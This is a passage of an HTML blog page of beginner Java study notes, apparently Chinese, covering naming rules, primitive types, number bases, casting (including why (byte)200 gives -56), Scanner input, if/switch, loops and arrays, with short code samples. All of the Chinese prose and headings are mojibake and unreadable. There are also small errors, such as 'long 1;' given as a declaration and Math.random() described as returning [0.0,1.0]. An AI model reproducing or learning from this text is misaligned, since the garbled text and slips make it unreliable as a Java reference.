æ–‡ä»¶æ˜¯ä»€ä¹ˆï¼Œä¸åŸæ–‡ä»¶åå­—æ²¡æœ‰ç›´æ¥å…³ç³»ã€‚</p><p>6ã€å½“ç±»æ˜¯å…¬å…±çš„ï¼Œæ—¢ç”¨publicä¿®é¥°ç±»ï¼Œç±»åå¿…é¡»ä¸æ–‡ä»¶åä¿æŒä¸€è‡´</p><p>7ã€ä¸€ä¸ªjavaæ–‡ä»¶ä¸­å¯ä»¥æœ‰å¤šä¸ªç±»ï¼Œæ¯ä¸ªç±»åœ¨ç¼–è¯‘åéƒ½ä¼šç”Ÿæˆä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶ã€‚</p><h2 id="æ ‡è¯†ç¬¦"><a href="#æ ‡è¯†ç¬¦" class="headerlink" title="æ ‡è¯†ç¬¦"></a>æ ‡è¯†ç¬¦</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210820972.png" alt="image-20220211210820972"></p><p>å…³é”®å­—æœ‰ï¼š</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220211210537067.png" alt="image-20220211210537067"></p><p>å…¶ä¸­constå’Œgotoæ˜¯ä¿ç•™å­—</p><h2 id="è§„èŒƒ"><a href="#è§„èŒƒ" class="headerlink" title="è§„èŒƒ:"></a>è§„èŒƒ:</h2><p>1ã€è§åçŸ¥æ„</p><p>2ã€é©¼å³°å‘½å</p><p>å½“å˜é‡å æ–¹æ³•å å‚æ•°å ç”±ä¸¤ä¸ªæˆ–ä¸¤ä¸ªå•è¯ä»¥ä¸Šç»„æˆæ—¶ï¼Œä»ç¬¬äºŒä¸ªå•è¯å¼€å§‹é¦–å­—æ¯å¤§å†™</p><p>å¦‚ï¼šuserName passWord</p><p>3ã€å¯¹å¸¸é‡è¿›è¡Œå‘½åæ—¶ï¼Œæ¯ä¸ªå•è¯çš„å­—æ¯éƒ½å¤§å†™ï¼Œè€Œä¸”å•è¯ä¸å•è¯ä¹‹é—´ä½¿ç”¨_ç›¸è¿</p><p>å¦‚: MAX_NUM</p><p>4ã€å¯¹ç±»è¿›è¡Œå‘½åæ—¶ï¼Œå¯¹æ¯ä¸€ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™</p><h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p>åŸºæœ¬æ•°æ®ç±»å‹(å››ç±»å…«ç§):</p><p>æ•´æ•°å‹:</p><p>â€‹        byte å­—èŠ‚ç±»å‹        short         int         long</p><p>æµ®ç‚¹ç±»å‹:</p><p>â€‹        float å•ç²¾åº¦        double åŒç²¾åº¦</p><p>å­—ç¬¦å‹: </p><p>â€‹        char</p><p>å¸ƒå°”å‹:</p><p>â€‹        boolean:</p><p>â€‹            true        false</p><p>å¼•ç”¨ç±»å‹æ•°æ®:å­—ç¬¦ä¸² ç±» æ¥å£</p><h2 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a>å¸¸é‡</h2><p> å­—ç¬¦ä¸²å¸¸é‡            æµ®ç‚¹ç±»å‹å¸¸é‡             å­—ç¬¦å¸¸é‡           å¸ƒå°”ç±»å‹å¸¸é‡            å†…ç½®çš„å¸¸é‡</p><p>â€œHelloWoerdâ€                3.14                         â€˜ä½ â€™                        true                       Math.PI</p><h2 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a>å˜é‡</h2><p>åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå…¶å€¼å¯ä»¥æ”¹å˜çš„é‡</p><p>ä¸‰è¦ç´ :</p><p>å˜é‡ç±»å‹        å˜é‡å        å˜é‡å€¼</p><p>å¦‚ä½•ç”³æ˜å˜é‡?</p><p>æ•°æ®ç±»å‹+å˜é‡å</p><p>ç”³æ˜æ•´æ•°ç±»å‹å˜é‡:</p><p>byte b;        long 1;</p><p>åŒç†å¯ç”Ÿæˆ</p><p>float f;    double d;    char c;    String s;</p><p>åœ¨æ–¹æ³•å†…çš„å˜é‡ ç”³æ˜åè¦èµ‹å€¼æ‰èƒ½ä½¿ç”¨</p><p>å˜é‡çš„å®è´¨å°±æ˜¯ç”³è¯·å†…å­˜</p><h1 id="day2-javaåŸºç¡€è¯­æ³•"><a href="#day2-javaåŸºç¡€è¯­æ³•" class="headerlink" title="day2  javaåŸºç¡€è¯­æ³•"></a>day2  javaåŸºç¡€è¯­æ³•</h1><h2 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢:"></a>è¿›åˆ¶è½¬æ¢:</h2><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            System.out.println(666);   //åè¿›åˆ¶            System.out.println(0b1010011010); //äºŒè¿›åˆ¶  0bå¼€å¤´            System.out.println(01232);  //å…«è¿›åˆ¶ 0å¼€å¤´            System.out.println(0x29a); //åå…­è¿›åˆ¶ 0xå¼€å¤´            &#125;&#125;</code></pre><p>è¾“å‡ºç»“æœ:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154216121.png" alt="image-20220212154216121"></p><h2 id="è®¡ç®—æœºå­˜å‚¨å•ä½"><a href="#è®¡ç®—æœºå­˜å‚¨å•ä½" class="headerlink" title="è®¡ç®—æœºå­˜å‚¨å•ä½"></a>è®¡ç®—æœºå­˜å‚¨å•ä½</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212154344804.png" alt="image-20220212154344804"></p><p>1 byte = 8 bit;  æ²¡æœ‰ç¬¦å·çš„èŒƒå›´: 2^8-1  æœ‰ç¬¦å·(ç¬¬ä¸€ä½åšç¬¦å·ä½): -128 - 127</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212160938532.png" alt="image-20220212160938532"></p><p>æ•´æ•°ç±»å‹   æ³¨æ„:</p><p>1ã€æ•´æ•°ç±»å‹ï¼Œé»˜è®¤çš„æ•°æ®ç±»å‹æ˜¯int</p><p>2ã€é”™è¯¯ï¼šä¸å…¼å®¹çš„ç±»å‹ï¼šä»intè½¬æ¢åˆ°byteå¯èƒ½æœ‰æŸå¤±</p><p>å½“æˆ‘ä»¬èµ‹çš„å€¼åœ¨byteæˆ–è€…shortçš„èŒƒå›´å†…åˆ™ä¸ä¼šæœ‰å˜åŒ–</p><p>ä½†æ˜¯å½“èµ‹çš„å€¼ä¸åœ¨byteæˆ–è€…shortçš„èŒƒå›´å†…åˆ™ä¼šå°†æ­¤å€¼ä½œä¸ºintç±»å‹å¤„ç†<br>3ã€é”™è¯¯:è¿‡å¤§çš„æ•´æ•°ï¼š2222222222</p><p>ç”Ÿå‘½longç±»å‹æ•°å€¼çš„æ—¶å€™ï¼Œè¦åœ¨æ•°å€¼çš„æœ«å°¾+L</p><p>æµ®ç‚¹ç±»å‹    æ³¨æ„:</p><p>1ã€æµ®ç‚¹ç±»å‹ é»˜è®¤çš„æ•°æ®ç±»å‹æ˜¯double</p><p>2ã€ä¸å…¼å®¹çš„ç±»å‹ï¼šä»doubleè½¬æ¢åˆ°floatå¯èƒ½ä¼šæœ‰æŸå¤±</p><p>ç”³æ˜floatç±»å‹çš„æ•°æ® è¦åœ¨æ•°å€¼çš„æœ«å°¾ +  F</p><p>float f =3.14F</p><p>3ã€æµ®ç‚¹ç±»å‹åº•å±‚é‡‡ç”¨çš„æ˜¯ç§‘å­¦è®¡æ•°æ³•æ–¹å¼</p><p>4ã€å°æ•°åº•å±‚å­˜å‚¨æ–¹å¼ä¸æ•´æ•°ä¸åŒ  æœ‰ç¬¦å·ä½ æŒ‡æ•°ä½ æ•´æ•°ä½</p><p>5ã€å°æ•°ä¸èƒ½ç²¾ç¡®çš„è¡¨ç¤ºä¸€ä¸ªå€¼ (å¦‚æœè¦ç²¾ç¡®çš„è¡¨ç¤ºéœ€è¦ç”¨åˆ°bigdecimal)</p><h2 id="è®¡ç®—æœºå¦‚ä½•å­˜å‚¨æ•°æ®"><a href="#è®¡ç®—æœºå¦‚ä½•å­˜å‚¨æ•°æ®" class="headerlink" title="è®¡ç®—æœºå¦‚ä½•å­˜å‚¨æ•°æ®"></a>è®¡ç®—æœºå¦‚ä½•å­˜å‚¨æ•°æ®</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172832527.png" alt="image-20220212172832527"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212172817453.png" alt="image-20220212172817453"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173056936.png" alt="image-20220212173056936"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212173119494.png" alt="image-20220212173119494"></p><h2 id="è‡ªåŠ¨ç±»å‹æå‡"><a href="#è‡ªåŠ¨ç±»å‹æå‡" class="headerlink" title="è‡ªåŠ¨ç±»å‹æå‡"></a>è‡ªåŠ¨ç±»å‹æå‡</h2><p>åŸºæœ¬ç±»å‹æ•°æ®è½¬æ¢:</p><p>1ã€è‡ªåŠ¨ç±»å‹æå‡</p><p>å°çš„æ•°æ®ç±»å‹ å¯ä»¥è‡ªåŠ¨è½¬æ¢ä¸ºå¤§çš„æ•°æ®ç±»å‹</p><pre><code class="java">int d = 3;double f = d;</code></pre><p>2ã€å¼ºåˆ¶ç±»å‹è½¬æ¢</p><p>é”™è¯¯ï¼šä¸å…¼å®¹çš„ç±»å‹ï¼Œä»doubleè½¬æ¢åˆ°intå¯èƒ½ä¼šæœ‰æŸå¤±</p><p> å¼ºåˆ¶è½¬æ¢çš„å…¬å¼:</p><p>å°çš„æ•°æ®ç±»å‹ æ ‡è¯†ç¬¦ = (å°çš„æ•°æ®ç±»å‹)å¤§çš„æ•°æ®ç±»å‹</p><pre><code class="java">double d = 3.14;int num = (int)d;</code></pre><p>ç‰¹æ®Šæƒ…å†µ</p><pre><code class="java">class Sakura&#123;        public static void main(String [] args)&#123;            int a = 200;            byte b = (byte)a;            System.out.println(b);        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221045664.png" alt="image-20220212221045664"></p><p>ä¸ºä»€ä¹ˆè¿™é‡Œæ˜¯-56å‘¢ï¼Ÿ</p><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“ intæ˜¯å››ä¸ªå­—èŠ‚ï¼Œè€Œbyteåªæœ‰ä¸€ä¸ªå­—èŠ‚ï¼Œ200çš„äºŒè¿›åˆ¶æ•°ä¸º 11001000</p><p>åˆšå¥½byteå¯ä»¥å…¨éƒ¨æ¥å—ï¼Œä½†æ˜¯byteç¬¬ä¸€ä½æ˜¯ç¬¦å·ä½ï¼Œé¦–ä½æ˜¯1ï¼Œæ‰€ä»¥æ˜¯è´Ÿæ•°ï¼Œè®¡ç®—æœºçš„å­˜å‚¨æ–¹å¼æ˜¯ä»¥è¡¥ç çš„å½¢å¼å­˜å‚¨ã€‚11001000â€”&gt;10110111(åç )â€”&gt;10111000(è¡¥ç )</p><p>è½¬åŒ–ä¸ºåè¿›åˆ¶å°±æ˜¯-56</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212221721358.png" alt="image-20220212221721358"></p><h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222704014.png" alt="image-20220212222704014"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212222746808.png" alt="image-20220212222746808"></p><p>æ³¨æ„:</p><p>1ã€æ•´æ•°ç›¸é™¤ï¼Œä¸ä¿ç•™å°æ•°</p><p>2ã€å¦‚æœæƒ³è¦æ˜¾ç¤ºå°æ•°ï¼Œä½¿ç”¨æµ®ç‚¹ç±»å‹è®¡ç®—</p><p>3ã€ byteä¸byte  shortä¸short charä¸char åšè¿ç®—ï¼Œæˆ–è€…ä»–ä»¬ä¹‹é—´æ··åˆè¿ç®—ï¼Œåˆ™ç»“æœä¼šå˜ä¸ºintç±»å‹</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212225720878.png" alt="image-20220212225720878"></p><p>ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦æ˜¯ä¸ä¼šå‘ç”Ÿç±»å‹è½¬æ¢çš„</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220212230210588.png" alt="image-20220212230210588"></p><h3 id="é€»è¾‘è¿ç®—ç¬¦"><a href="#é€»è¾‘è¿ç®—ç¬¦" class="headerlink" title="é€»è¾‘è¿ç®—ç¬¦"></a>é€»è¾‘è¿ç®—ç¬¦</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220213150338148.png" alt="image-20220213150338148"></p><h3 id="è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#è¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="è¿ç®—ç¬¦ä¼˜å…ˆçº§"></a>è¿ç®—ç¬¦ä¼˜å…ˆçº§</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220213150648548.png" alt="image-20220213150648548"></p><h1 id="day3-æµç¨‹æ§åˆ¶è¯­å¥"><a href="#day3-æµç¨‹æ§åˆ¶è¯­å¥" class="headerlink" title="day3  æµç¨‹æ§åˆ¶è¯­å¥"></a>day3  æµç¨‹æ§åˆ¶è¯­å¥</h1><h2 id="è¾“å…¥è¯­å¥-scanner"><a href="#è¾“å…¥è¯­å¥-scanner" class="headerlink" title="è¾“å…¥è¯­å¥ scanner"></a>è¾“å…¥è¯­å¥ scanner</h2><pre><code class="java">import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;            Scanner input = new Scanner(System.in);            // åˆ›å»ºinputå¯¹è±¡, &quot;input&quot;æ˜¯å˜é‡ï¼Œå¯ä¸ºä»»æ„å€¼            // System.in è¾“å…¥æµ             // è¾“å…¥æ•°æ®å¿…é¡»ä¸æ¥å—ç±»å‹åŒ¹é…ï¼Œä¸ç„¶ä¼šæŠ¥é”™ å¦‚ä¸‹å›¾            //Scannerç±»å‹æ²¡æœ‰æä¾›è¿”å›charç±»å‹æ•°æ®çš„æ–¹æ³•            /*            å¯ä»¥é‡‡ç”¨ å­—ç¬¦ä¸².charAt(0);   0ä»£è¡¨å­—ç¬¦ä¸²å†…ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œ1ä»£è¡¨ç¬¬äºŒä¸ª......            char cc = &quot;ä½ å¥½&quot;.charAt(0);            System.out.println(cc);   ---ä½             */            System.out.println(&quot;è¯·è¾“å…¥ä½ çš„å¹´é¾„&quot;);            int age = input.nextInt();            System.out.println(&quot;ä½ çš„å¹´é¾„æ˜¯&quot;+age);            System.out.println(&quot;è¯·è¾“å…¥ä½ çš„èº«é«˜&quot;);            double height = input.nextDouble();            System.out.println(&quot;ä½ çš„èº«é«˜æ˜¯&quot;+height);            System.out.println(&quot;è¯·è¾“å…¥ä½ çš„å§“å&quot;);            String name = input.next();            System.out.println(&quot;ä½ çš„å§“åæ˜¯&quot;+name);            &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220219224259748.png" alt="image-20220219224259748"></p><h2 id="nextä¸nextLine"><a href="#nextä¸nextLine" class="headerlink" title="nextä¸nextLine"></a>nextä¸nextLine</h2><p>é”®ç›˜è¾“å…¥ä¸€ä¸ªåœ°å€</p><pre><code class="java">/*1ã€å¯¼åŒ…2ã€åˆ›å»ºå¯¹è±¡3ã€å¯¹è±¡è°ƒæ–¹æ³•*/import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;æ‚¨çš„åœ°å€æ˜¯&quot;);        String address = input.next();        System.out.println(&quot;æ‚¨çš„åœ°å€æ˜¯&quot;+address);    &#125;    &#125;</code></pre><p>æ³¨æ„:<br>    next()æ— æ³•æ¥å— ç©ºæ ¼ä¹‹åçš„å†…å®¹</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220223643121.png" alt="image-20220220223643121"></p><p>æ­¤æ—¶æˆ‘ä»¬å¯ä»¥ç”¨nextLine(å¯ä»¥æ¥å—æ•´è¡Œå†…å®¹)</p><pre><code class="java">String address = input.nextLine();</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220223819952.png" alt="image-20220220223819952"></p><p>nextLineå­˜åœ¨ä¸€äº›é—®é¢˜:</p><pre><code class="java">import java.util.*;class InputTest&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);         System.out.println(&quot;æ‚¨çš„èº«é«˜æ˜¯&quot;);        double height = input.nextDouble();        System.out.println(&quot;æ‚¨çš„èº«é«˜æ˜¯:&quot;+height);        System.out.println(&quot;æ‚¨çš„åœ°å€æ˜¯&quot;);        String address = input.nextLine();        System.out.println(&quot;æ‚¨çš„åœ°å€æ˜¯:&quot;+address);    &#125;&#125;</code></pre><p>å½“ä»£ç å¦‚ä¸Šæ—¶ï¼Œè¿è¡Œç¨‹åºä¼šå‡ºç°ä»¥ä¸‹åæœ:</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220224758917.png" alt="image-20220220224758917"></p><p>æˆ‘ä»¬å‘ç°ç¬¬äºŒä¸ªè¾“å‡ºç›´æ¥ç»“æŸäº†ï¼Œè¿™æ˜¯å› ä¸ºnextLineé‡åˆ°å›è½¦ï¼Œä¼šè¯¯è®¤ä¸ºä»£ç å·²ç»ç»“æŸäº†ã€‚</p><p>è§£å†³åŠæ³•:</p><p>åœ¨ä¸­é—´åŠ å…¥ä¸€ä¸ª</p><pre><code class="java">input.nextLine();</code></pre><p>æ¥æ¥å—å›è½¦</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220225008607.png" alt="image-20220220225008607"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220225108040.png" alt="image-20220220225108040"></p><p>è¿™æ ·é—®é¢˜å°±è§£å†³äº†</p><h2 id="ifå•åˆ†æ”¯"><a href="#ifå•åˆ†æ”¯" class="headerlink" title="ifå•åˆ†æ”¯"></a>ifå•åˆ†æ”¯</h2><pre><code class="java">/*ifåˆ†æ”¯ï¼š    ifå•åˆ†æ”¯        if(booleanè¡¨è¾¾å¼)&#123;            åˆ†æ”¯å†…å®¹        &#125;*/import java.util.*;class IfTest&#123;    public static void main(String [] args)&#123;        Scanner in = new Scanner(System.in);        System.out.println(&quot;è¯·è¾“å…¥æ‚¨çš„å¹´é¾„&quot;);        int age = in.nextInt();        if(age &gt;= 18)&#123;            System.out.println(&quot;æ‚¨å·²ç»æˆå¹´ï¼Œå¯ä»¥ä¸Šç½‘äº†&quot;);        &#125;        if(age &lt; 18)&#123;            System.out.println(&quot;æ‚¨è¿˜æ²¡æœ‰æˆå¹´,please go out!&quot;);        &#125;        &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220231710122.png" alt="image-20220220231710122"></p><h2 id="å°ä¹ é¢˜-é—°å¹´çš„æ ‡å‡†"><a href="#å°ä¹ é¢˜-é—°å¹´çš„æ ‡å‡†" class="headerlink" title="å°ä¹ é¢˜-é—°å¹´çš„æ ‡å‡†"></a>å°ä¹ é¢˜-é—°å¹´çš„æ ‡å‡†</h2><p>é—°å¹´çš„æ ‡å‡†(ä¸¤è€…æ»¡è¶³å…¶ä¸€å³å¯):</p><p>1ã€èƒ½è¢«4æ•´é™¤ï¼Œä¸èƒ½è¢«100æ•´é™¤</p><p>2ã€èƒ½è¢«400æ•´é™¤</p><p>ä»£ç åŠŸèƒ½:</p><p>è¾“å…¥ä¸€ä¸ªæ•°åˆ¤æ–­æ˜¯å¦æ˜¯é—°å¹´</p><pre><code class="java">import java.util.*;class RunYears&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;è¯·è¾“å…¥ä¸€ä¸ªå¹´ä»½:&quot;);        int years = input.nextInt();        if((years%4==0&amp;&amp;years%100!=0)||(years%400==0))            System.out.println(years+&quot;æ˜¯é—°å¹´ï¼&quot;);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220233501106.png" alt="image-20220220233501106"></p><h2 id="ifåŒåˆ†æ”¯"><a href="#ifåŒåˆ†æ”¯" class="headerlink" title="ifåŒåˆ†æ”¯"></a>ifåŒåˆ†æ”¯</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220220233824314.png" alt="image-20220220233824314"></p><h2 id="æ±‚ä¸‰ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼"><a href="#æ±‚ä¸‰ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼" class="headerlink" title="æ±‚ä¸‰ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼"></a>æ±‚ä¸‰ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼</h2><pre><code class="java">import java.util.*;class MaxNum&#123;    public static void main(String [] args)&#123;        int a = 50;        int b = 999;        int c = 12;        if(a &gt; b)&#123;            if(a &gt; c)&#123;                System.out.println(&quot;aæ˜¯ä¸‰ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼&quot;);            &#125;else&#123;                System.out.println(&quot;cæ˜¯ä¸‰ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼&quot;);            &#125;                &#125;else&#123;            if(b &lt; c)&#123;                System.out.println(&quot;cæ˜¯ä¸‰ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼&quot;);            &#125;else&#123;                System.out.println(&quot;bæ˜¯ä¸‰ä¸ªæ•°ä¸­çš„æœ€å¤§å€¼&quot;);            &#125;                    &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221001754310.png" alt="image-20220221001754310"></p><h2 id="ifå¤šåˆ†æ”¯"><a href="#ifå¤šåˆ†æ”¯" class="headerlink" title="ifå¤šåˆ†æ”¯"></a>ifå¤šåˆ†æ”¯</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221002157818.png" alt="image-20220221002157818"></p><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><p> <img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221002546023.png" alt="image-20220221002546023"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221003440041.png" alt="image-20220221003440041"></p><p>caseåé¢çš„æ•°æ®å¿…é¡»ä¸è¡¨è¾¾å¼ç±»å‹ä¸€è‡´</p><h2 id="å¾ªç¯"><a href="#å¾ªç¯" class="headerlink" title="å¾ªç¯"></a>å¾ªç¯</h2><p>æ»¡è¶³ç‰¹å®šæ¡ä»¶åå¤æ‰§è¡Œçš„ä»£ç </p><p>ä»»ä½•ä¸€ä¸ªæ ‡å‡†çš„å¾ªç¯éƒ½æœ‰å››ä¸ªæ¡ä»¶:</p><p><strong>åˆå§‹åŒ–æ¡ä»¶</strong></p><p><strong>å¾ªç¯æ¡ä»¶</strong></p><p><strong>å¾ªç¯ä½“</strong></p><p><strong>è¿­ä»£æ¡ä»¶</strong></p><p>å®ä¾‹:</p><pre><code class="java">import java.util.*;class Repeat&#123;     public static void main(String [] args)&#123;        int i = 0;        while(i&lt;10)&#123;            System.out.println(&quot;Hello Word&quot;);            i++;        &#125;            &#125;        &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221005248322.png" alt="image-20220221005248322"></p><h1 id="day4-å¾ªç¯"><a href="#day4-å¾ªç¯" class="headerlink" title="day4 å¾ªç¯"></a>day4 å¾ªç¯</h1><h2 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221233148427.png" alt="image-20220221233148427"></p><h2 id="éšæœºæ•°å…¬å¼"><a href="#éšæœºæ•°å…¬å¼" class="headerlink" title="éšæœºæ•°å…¬å¼"></a>éšæœºæ•°å…¬å¼</h2><p>Math.random();         è¿”å›ä¸€ä¸ªdoubleå€¼ [0.0,1.0]</p><p>å¦‚æœæˆ‘ä»¬è¦æ±‚ m~nçš„æ•°</p><p>å…¬å¼: (int)(Math.random()*(n-m+1)+m);</p><h2 id="forå¾ªç¯"><a href="#forå¾ªç¯" class="headerlink" title="forå¾ªç¯"></a>forå¾ªç¯</h2><pre><code class="java">for å¾ªç¯:    for(åˆå§‹åŒ–æ¡ä»¶;å¾ªç¯æ¡ä»¶;è¿­ä»£æ¡ä»¶)&#123;        å¾ªç¯ä½“        &#125;</code></pre><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221234457129.png" alt="image-20220221234457129"></p><h2 id="continueã€returnã€continueçš„åŒºåˆ«"><a href="#continueã€returnã€continueçš„åŒºåˆ«" class="headerlink" title="continueã€returnã€continueçš„åŒºåˆ«"></a>continueã€returnã€continueçš„åŒºåˆ«</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221234650112.png" alt="image-20220221234650112"></p><h1 id="day5-æ•°ç»„"><a href="#day5-æ•°ç»„" class="headerlink" title="day5 æ•°ç»„"></a>day5 æ•°ç»„</h1><h2 id="æ•°ç»„åˆè¯†"><a href="#æ•°ç»„åˆè¯†" class="headerlink" title="æ•°ç»„åˆè¯†"></a>æ•°ç»„åˆè¯†</h2><p>æ•°ç»„: å®¹å™¨ å­˜å‚¨æ•°æ®</p><p>ç›¸åŒç±»å‹æ•°æ®çš„æœ‰åºé›†åˆ</p><h3 id="å£°æ˜ä¸€ä¸ªæ•°ç»„"><a href="#å£°æ˜ä¸€ä¸ªæ•°ç»„" class="headerlink" title="å£°æ˜ä¸€ä¸ªæ•°ç»„"></a>å£°æ˜ä¸€ä¸ªæ•°ç»„</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222000443403.png" alt="image-20220222000443403"></p><h3 id="æ•°ç»„åˆå§‹åŒ–"><a href="#æ•°ç»„åˆå§‹åŒ–" class="headerlink" title="æ•°ç»„åˆå§‹åŒ–"></a>æ•°ç»„åˆå§‹åŒ–</h3><p>ä¸¤ç§</p><h4 id="é™æ€åˆå§‹åŒ–"><a href="#é™æ€åˆå§‹åŒ–" class="headerlink" title="é™æ€åˆå§‹åŒ–"></a>é™æ€åˆå§‹åŒ–</h4><pre><code class="java">arr = new int[]&#123;1,2,3,4,5&#125;;  int [] arr1 = new int[]&#123;1,2,3,4,5&#125;;//å·²ç»æŒ‡å®šå…ƒç´ </code></pre><h4 id="åŠ¨æ€åˆå§‹åŒ–"><a href="#åŠ¨æ€åˆå§‹åŒ–" class="headerlink" title="åŠ¨æ€åˆå§‹åŒ–"></a>åŠ¨æ€åˆå§‹åŒ–</h4><pre><code class="java">arr =new int[4]; //æ²¡æœ‰æŒ‡å®šå…ƒç´ double [] arrDouble = new double[5];</code></pre><p>æ³¨æ„:</p><p><strong>æ•°ç»„å†…å…ƒç´ çš„ç±»å‹è¦ä¿æŒä¸€è‡´</strong></p><h3 id="æ•°ç»„å…ƒç´ çš„è®¿é—®"><a href="#æ•°ç»„å…ƒç´ çš„è®¿é—®" class="headerlink" title="æ•°ç»„å…ƒç´ çš„è®¿é—®"></a>æ•°ç»„å…ƒç´ çš„è®¿é—®</h3><pre><code class="java">int [] arr = &#123;1,2,3&#125;;System.out.println(arr[0]);System.out.println(arr[1]);System.out.println(arr[2 ]);</code></pre><h3 id="æ•°ç»„é•¿åº¦æ˜¾ç¤º"><a href="#æ•°ç»„é•¿åº¦æ˜¾ç¤º" class="headerlink" title="æ•°ç»„é•¿åº¦æ˜¾ç¤º"></a>æ•°ç»„é•¿åº¦æ˜¾ç¤º</h3><p>arr.length è¡¨ç¤ºæ•°ç»„å†…å…ƒç´ çš„æ•°é‡</p><pre><code class="java">System.out.println(arr.length);    </code></pre><p>è·å–æœ€åä¸€ä¸ªå…ƒç´ çš„å·§å¦™æ–¹æ³•</p><pre><code class="java">System.out.println(arr[arr.length-1]);</code></pre><h2 id="æ•°ç»„çš„é»˜è®¤åˆå§‹åŒ–"><a href="#æ•°ç»„çš„é»˜è®¤åˆå§‹åŒ–" class="headerlink" 